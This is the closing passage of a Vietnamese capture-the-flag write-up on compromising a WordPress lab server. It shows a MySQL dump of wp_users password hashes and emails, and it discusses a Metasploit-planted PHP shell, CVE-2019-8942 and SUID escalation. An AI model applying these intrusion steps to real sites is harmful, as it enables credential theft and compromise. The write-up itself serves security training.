<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=n>use</span><span class=w> </span><span class=n>blog</span>
</code></pre></div> Xem thông tin user</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_users</span>
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_users</span>
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a><span class=w>    </span><span class=o>-&gt;</span><span class=w> </span><span class=p>;</span>
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a><span class=p>;</span>
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a><span class=o>+</span><span class=c1>----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+</span>
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a><span class=o>|</span><span class=w> </span><span class=n>ID</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>user_login</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>user_pass</span><span class=w>                          </span><span class=o>|</span><span class=w> </span><span class=n>user_nicename</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>user_email</span><span class=w>                   </span><span class=o>|</span><span class=w> </span><span class=n>user_url</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>user_registered</span><span class=w>     </span><span class=o>|</span><span class=w> </span><span class=n>user_activation_key</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>user_status</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>display_name</span><span class=w>  </span><span class=o>|</span>
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a><span class=o>+</span><span class=c1>----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+</span>
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>bjoel</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=n>P$BjoFHe8zIyjnQe</span><span class=o>/</span><span class=n>CBvaltzzC6ckPcO</span><span class=o>/</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>bjoel</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>nconkl1</span><span class=o>@</span><span class=n>outlook</span><span class=p>.</span><span class=n>com</span><span class=w>          </span><span class=o>|</span><span class=w>          </span><span class=o>|</span><span class=w> </span><span class=mi>2020</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>26</span><span class=w> </span><span class=mi>03</span><span class=p>:</span><span class=mi>52</span><span class=p>:</span><span class=mi>26</span><span class=w> </span><span class=o>|</span><span class=w>                     </span><span class=o>|</span><span class=w>           </span><span class=mi>0</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Billy</span><span class=w> </span><span class=n>Joel</span><span class=w>    </span><span class=o>|</span>
<a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>kwheel</span><span class=w>     </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=n>P$BedNwvQ29vr1TPd80CDl6WnHyjr8te</span><span class=p>.</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>kwheel</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>zlbiydwrtfjhmuuymk</span><span class=o>@</span><span class=n>ttirv</span><span class=p>.</span><span class=n>net</span><span class=w> </span><span class=o>|</span><span class=w>          </span><span class=o>|</span><span class=w> </span><span class=mi>2020</span><span class=o>-</span><span class=mi>05</span><span class=o>-</span><span class=mi>26</span><span class=w> </span><span class=mi>03</span><span class=p>:</span><span class=mi>57</span><span class=p>:</span><span class=mi>39</span><span class=w> </span><span class=o>|</span><span class=w>                     </span><span class=o>|</span><span class=w>           </span><span class=mi>0</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Karen</span><span class=w> </span><span class=n>Wheeler</span><span class=w> </span><span class=o>|</span>
<a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a><span class=o>+</span><span class=c1>----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+</span>
<a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span>
</code></pre></div> <p>Rồi, ta thấy được 2 user là bjoel và kwheel và 2 password đã được băm</p> <blockquote> <p>Bạn có thể xem thuật toán băm tại /wp-includes/class-phpass.php đối với ngữ cảnh challenge này hoặc xem tại <a href=https://github.com/WordPress/WordPress/blob/master/wp-includes/class-phpass.php>WordPress</a></p> </blockquote> <details class=question> <summary>Xem xem xem</summary> <p>Tại sao ta có user kwheel trên website WordPress nhưng ở máy chủ thì không hiện use kwheel trong /home? Vấn đề nằm ở đâu?</p> </details> <h3 id=jtygchfpnfphp><strong>JTygChfpNf.php</strong><a class=headerlink href=#jtygchfpnfphp title="Permanent link">&para;</a></h3> <p>Nhìn hình bên dưới ta thấy có file lạ mang tên JTygChfpNf.php</p> <p> <figure><img src=image-12.png><figcaption>File mơ hồ</figcaption> </figure> </p> <p>Thì file này chính là file từ Metasploit tạo ra trong phần <a href=#Pentest-scenario>kịch bản</a> ban nãy chúng ta triển khai đấy.</p> <blockquote> <p>Làm việc gì cũng phải suy nghĩ, khi mình khai thác Metasploit, thì ta nên biết được hành vi của nó diễn ra như nào và nó đã tiêm thứ gì lên hệ thống. Hơn nữa, cái file như thế xuất hiện trên hệ thống, liệu BlueTeam có dễ dàng phát hiện không?</p> </blockquote> <p> <figure><img src=image-13.png><figcaption>Sourcecode của file</figcaption> </figure> </p> <h2 id=what-we-learned><strong>What we learned</strong><a class=headerlink href=#what-we-learned title="Permanent link">&para;</a></h2> <ol> <li>Config DNS Server through hosts file</li> <li>Learn about WordPress </li> <li>CVE-2019-8942</li> <li>Privilege Escalation through SUID</li> </ol> <hr> <div class=md-source-file> <small> Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2023</span> <br> Created: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2023</span> </small> </div> <h2 id=__comments><strong>Comments</strong></h2> <script src=https://giscus.app/client.js data-repo=hieuhdh/hieuhdh.github.io data-repo-id=R_kgDOHowGCg data-category=General data-category-id=DIC_kwDOHowGCs4CQLlU data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=1 data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script> <script>
  var theme, giscus = document.querySelector("script[src*=giscus]"),
    palette = __md_get("__palette");
  palette && "object" == typeof palette.color && (theme = "slate" === palette.color.scheme ? "dark" : "light", giscus
    .setAttribute("data-theme", theme)), document.addEventListener("DOMContentLoaded", function () {
    document.querySelector("[data-md-component=palette]").addEventListener("change", function () {
      var e = __md_get("__palette");
      e && "object" == typeof e.color && (e = "slate" === e.color.scheme ? "dark" : "light", document
        .querySelector(".giscus-frame").contentWindow.postMessage({
          giscus: {
            setConfig: {
              theme: e
            }
          }
        }, "https://giscus.app"))
    })
  })

</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../javascripts/consent.js></script> <script src=../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../javascripts/tablesort.js></script> <script src=../../../overrides/assets/javascripts/bundle.ed7d8744.min.js></script> <script src=../../../overrides/assets/javascripts/cursor-effects.js></script> <!-- <script src="../../../assets/javascripts/cursor-effects.js"></script> --> </body> </html>